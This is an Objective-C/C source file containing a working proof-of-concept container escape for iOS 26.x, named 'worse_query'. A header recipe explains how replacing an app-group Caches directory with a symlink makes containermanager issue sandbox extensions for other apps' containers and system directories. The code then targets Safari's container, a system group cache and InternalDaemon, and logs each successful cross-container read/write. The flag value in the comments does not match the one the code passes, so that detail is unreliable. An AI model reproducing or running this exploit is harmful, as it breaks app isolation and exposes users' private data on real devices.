// ---------------------------------------------------------------------------
// worse_query (forcequitOS) — PUBLIC, UNPATCHED container escape.
// PoC coverage: iOS 26.0 - 26.7.2 and 27.2 (fixed only in 26.7.3 / 27.2.1, 9 Nov 2026).
//
//   Gives: read+write of every Application container, InternalDaemon,
//          PluginKitPlugin and all AppGroup containers.
//   Needs: ONE app-group id the app controls (com.apple.security.application-groups
//          is a standard, non-private entitlement).
//
// Recipe (from the PoC source):
//   1. containerURLForSecurityApplicationGroupIdentifier: -> <group>/Library/Caches
//   2. delete that directory, recreate it as a SYMLINK to the target
//   3. dlopen libsystem_containermanager.dylib, dlsym the container_query_* API
//   4. class 7 (appGroup), part 3 (Library/Caches), group identifiers as xpc_string
//   5. flags: 0x8000000000 on iOS 26.x (0x80000000000 elsewhere)
//   6. container_copy_sandbox_token(result) -> sandbox_extension_consume(token)
//
// Root cause: the manager resolves the requested part through the filesystem,
// follows the attacker symlink, and issues the extension for whatever it lands on
// without re-checking that it stayed inside the app-group container.
// ---------------------------------------------------------------------------
static const char *kCM = "/usr/lib/system/libsystem_containermanager.dylib";

typedef void *(*cm_create)(void);
typedef void (*cm_setclass)(void *, uint64_t);
typedef void (*cm_setgids)(void *, xpc_object_t);
typedef void (*cm_setflags)(void *, uint64_t);
typedef void (*cm_setpart)(void *, uint64_t);
typedef void (*cm_setdom)(void *, const char *);
typedef void *(*cm_result)(void *);
typedef void (*cm_free)(void *);
typedef char *(*cm_token)(void *);
typedef int64_t (*sb_consume)(const char *);

static int64_t wq(const char *group, const char *target, uint64_t flags) {
    void *m = dlopen(kCM, RTLD_NOW | RTLD_LOCAL);
    if (!m) return -1;
    cm_create  qcreate  = (cm_create) dlsym(m, "container_query_create");
    cm_setclass qclass  = (cm_setclass) dlsym(m, "container_query_set_class");
    cm_setgids  qgids   = (cm_setgids)  dlsym(m, "container_query_set_group_identifiers");
    cm_setflags qflags  = (cm_setflags) dlsym(m, "container_query_operation_set_flags");
    cm_setpart  qpart   = (cm_setpart)  dlsym(m, "container_query_operation_set_part");
    cm_setdom   qdom    = (cm_setdom)   dlsym(m, "container_query_operation_set_part_domain");
    cm_result   qres    = (cm_result)   dlsym(m, "container_query_get_single_result");
    cm_free     qfree   = (cm_free)     dlsym(m, "container_query_free");
    cm_token    ctoken  = (cm_token)    dlsym(m, "container_copy_sandbox_token");
    sb_consume  consume = (sb_consume)  dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
    if (!qcreate || !qclass || !qgids || !qflags || !qpart || !qdom || !qres || !ctoken || !consume) {
        dlclose(m); return -1;
    }
    void *q = qcreate();
    if (!q) { dlclose(m); return -2; }
    qclass(q, 7);                                   // 7 = appGroup, served by containermanagerd
    xpc_object_t ident = xpc_string_create(group);
    qgids(q, ident);
    qpart(q, 3);                                    // 3 = Library/Caches
    qdom(q, target);
    qflags(q, flags);                               // 0x8000000000 on iOS 26.x
    void *r = qres(q);
    if (!r) { qfree(q); dlclose(m); return -3; }
    char *tok = ctoken(r);
    if (!tok) { qfree(q); dlclose(m); return -4; }
    int64_t h = consume(tok);
    free(tok); qfree(q); dlclose(m);
    return h;
}

NSString *ModWorseQuery(void) {
    // our own app group (the standard, non-private entitlement)
    NSString *bid = [[NSBundle mainBundle] bundleIdentifier];
    NSString *grp = [NSString stringWithFormat:@"group.cc.forcequit.bad-query"];
    (void)bid;
    NSFileManager *fm = [NSFileManager defaultManager];

    // 1. the app-group Caches directory
    NSURL *cache = [fm containerURLForSecurityApplicationGroupIdentifier:grp];
    if (!cache) return @"containerURLForSecurityApplicationGroupIdentifier failed (no app group?)";
    NSString *cachePath = [cache.path stringByAppendingPathComponent:@"Library/Caches"];
    AveLog([NSString stringWithFormat:@"    app-group Caches: %@", cachePath]);

    // keep whatever is there, so we can restore it
    NSString *backup = [cachePath stringByAppendingString:@".rootsuite_bak"];
    [fm removeItemAtPath:backup error:nil];
    NSError *e = nil;
    if ([fm fileExistsAtPath:cachePath] && ![fm moveItemAtPath:cachePath toPath:backup error:&e]) {
        AveLog([NSString stringWithFormat:@"    could not move the caches dir aside: %@", e.localizedDescription ?: @"?"]);
    }

    // 2. targets: another app's container + a shared system group
    struct { const char *tag; const char *target; const char *probe; } T[] = {
        {"MobileSafari container", "/private/var/containers/Bundle/Application/C0A5D99D-1E16-447B-886B-160A42BB95EF", NULL},
        {"Shared SystemGroup", "/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache", NULL},
        {"InternalDaemon", "/private/var/containers/InternalDaemon", NULL},
    };
    int ok = 0;
    for (unsigned i = 0; i < sizeof(T)/sizeof(T[0]); i++) {
        // recreate the directory as a symlink to the target
        [fm removeItemAtPath:cachePath error:nil];
        NSError *se = nil;
        if (![fm createSymbolicLinkAtPath:cachePath withDestinationPath:[NSString stringWithUTF8String:T[i].target] error:&se]) {
            AveLog([NSString stringWithFormat:@"    symlink -> %-34s failed: %@", T[i].tag,
                    se.localizedDescription ?: @"?"]);
            continue;
        }
        int64_t h = wq(grp.UTF8String, T[i].target, 0x0000000800000000ULL);   // iOS 26.x flags
        if (h > 0) {
            ok++;
            // prove read: read through the extension
            NSString *testPath = [NSString stringWithFormat:@"%@/%@",
                                  cachePath, @"Documents"];
            NSArray *ls = [fm contentsOfDirectoryAtPath:testPath error:nil];
            AveLog([NSString stringWithFormat:@"    ESCAPE  %-34s handle=%lld, entries=%lu", T[i].tag, h,
                    (unsigned long)ls.count]);
        } else {
            AveLog([NSString stringWithFormat:@"    denied  %-34s handle=%lld", T[i].tag, h]);
        }
    }

    // restore the app-group caches directory
    [fm removeItemAtPath:cachePath error:nil];
    if ([fm fileExistsAtPath:backup]) [fm moveItemAtPath:backup toPath:cachePath error:nil];

    if (ok > 0) {
        AveSetStatus(@"container escape CONFIRMED (cross-container R/W)");
        return [NSString stringWithFormat:@"worse_query: escape on %d/3 targets - cross-container R/W as uid 501", ok];
    }
    AveSetStatus(@"worse_query: no escape on this build");
    return [NSString stringWithFormat:@"worse_query: 0/%d (patched or flags differ)", 3];
}
